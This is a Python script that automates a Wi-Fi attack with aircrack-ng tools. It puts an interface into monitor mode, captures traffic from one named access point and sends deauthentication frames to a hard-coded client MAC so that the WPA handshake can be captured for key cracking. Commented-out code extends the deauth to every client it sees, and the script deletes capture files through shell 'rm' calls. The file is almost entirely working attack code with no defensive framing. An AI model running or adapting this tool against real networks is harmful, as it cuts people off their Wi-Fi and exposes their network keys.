#!/usr/bin/env python

from __future__ import print_function

import os, subprocess, select, time
from multiprocessing import Process

SECONDS = 9 
BSSID = {
    "BSSID": "98:DE:D0:21:12:0F",
    "CH": "9",
    "ESSID": "TP-LINK_120F",
}
DMAC = "30:3A:64:B0:8B:EB"

def setup_network():

    #out = subprocess.check_output("rm testcap*".split(" "), stderr=subprocess.STDOUT)
    #out = subprocess.check_output("rm capture*".split(" "))
    out = subprocess.check_output("airmon-ng check kill".split(" "))
    #print(out)
    out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))
    #print(out)

    # Get a monitor mode network device from iwconfig
    p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p2.communicate()
    result = err + out
    #print(result)
    managed = ""
    #interfaces = [r.split()[0] for r in result.split("\n\n")]
    interfaces = []
    for r in result.split("\n\n"):
        interface = r.split()[0]
        interfaces.append(interface)
        if "Managed" or "Promiscous" in r:
            managed = interface
    #print(interfaces)
    print("Using {} as the interface".format(managed))

    out = subprocess.check_output("ifconfig {} down".format(managed).split(" "))
    #print(out)
    out = subprocess.check_output("airmon-ng start {}".format(managed).split(" "))
    #print(out)
    #TODO: programmatically get the new monitor mode network
    mon_managed = managed + "mon"
    return mon_managed

def reset_network(interface_name):
    #print("Reseting network...")
    out = subprocess.check_output("airmon-ng stop {}".format(interface_name).split(" "))
    #print(out)
    out = subprocess.check_output("service network-manager restart".split(" "))
    #print(out)
    #print("Reset Network")

def send_deauth(bssid, dmac, interface_name, seconds):
    print("SECONDS: {}".format(seconds))
    print("sending {0} deauth(s) to DMAC:{1} in BSSID:{2}".format(seconds, dmac, bssid["BSSID"]))
    print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name))
    #aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>
    p = subprocess.Popen("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    p.wait()
    print(out, err)

def capture_handshake(bssid, interface_name):
    out = subprocess.check_output("airmon-ng start {0} {1}".format(interface_name, 9).split(" "))
    print("Capturing packets for {0} on channel {1} [BSSID: {2}]..."\
            .format(bssid["ESSID"], bssid["CH"], bssid["BSSID"]))
    print("airodump-ng -c {0} --bssid {1} -w handshake {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
    p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake {2}"\
            .format(bssid["CH"], bssid["BSSID"], interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    """
    dmac_map = {}
    processes = []
    poll = select.poll()
    poll.register(p.stderr)

    out = ""
    start = time.time()
    while time.time() - start < 2:
        rlist = poll.poll()
        for fd, event in rlist:
            out += os.read(fd, 2048)

    poll.unregister(p.stderr)
    
    #out2arr = out.split("\n")
    out2arr = out.split("\x1b[J\x1b[1;1H\n")
    #out2arr = out.split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[1]
        #print(lines[4:])
        lines = info.split("\n")[2:-1]
        #print(info.strip())
        #print(lines[2:-1])
        #print(len(info))
        #print('~~~~~')
        for line in lines:
            #data = line.strip().split()
            data = line.split()
            dmac = data[1]
            #print(dmac)

            if dmac not in dmac_map:
                print("new dmac: {}".format(dmac))
                dmac_map[dmac] = True
                deauth = Process(target = send_deauth, args=(bssid, dmac, interface_name, SECONDS))
                processes.append(deauth)
                deauth.start()
                deauth.join()
    #print(out2arr)
    """
    #deauth = Process(target = send_deauth, args=(bssid, DMAC, interface_name, SECONDS))
    #deauth.start()
    #deauth.join()
    send_deauth(bssid, DMAC, interface_name, SECONDS)

    """
    print('deauthing', end='')
    while len(processes) != 0:
        print('.', end='')
        for i in range(len(processes)):
            process = processes[i]
            if not process.is_alive():
                processes.pop(i)
                i -= 1
        time.sleep(1)
        for p in processes[:]:
            #p = processes[i]
            if not p.is_alive():
                #processes.pop(i)
                #i -= 1
                processes.remove(p)
        time.sleep(1)
    """

    p.terminate()

if __name__ == "__main__":
    os.system("rm testcap*")
    os.system("rm handshake*")
    interface = setup_network()
    try:
        capture_handshake(BSSID, interface)
    finally:
        time.sleep(1)
        reset_network(interface)